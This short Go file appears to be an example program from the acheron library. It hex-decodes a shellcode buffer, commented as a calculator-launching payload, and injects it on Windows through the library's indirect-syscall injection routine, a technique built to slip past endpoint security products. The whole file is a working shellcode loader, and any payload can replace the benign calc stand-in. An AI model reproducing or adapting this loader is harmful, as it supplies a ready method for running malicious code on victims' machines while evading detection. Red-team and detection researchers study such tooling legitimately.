//go:build windows

package main

import (
	"encoding/hex"

	"github.com/f1zm0/acheron"
	"github.com/f1zm0/acheron/examples/sc_inject/inject"
)

func main() {
	// calc shellcode
	scBuf, _ := hex.DecodeString(
		"505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3",
	)

	ach, err := acheron.New()
	if err != nil {
		panic(err)
	}

	if err := inject.Inject(ach, scBuf); err != nil {
		panic(err)
	}
}
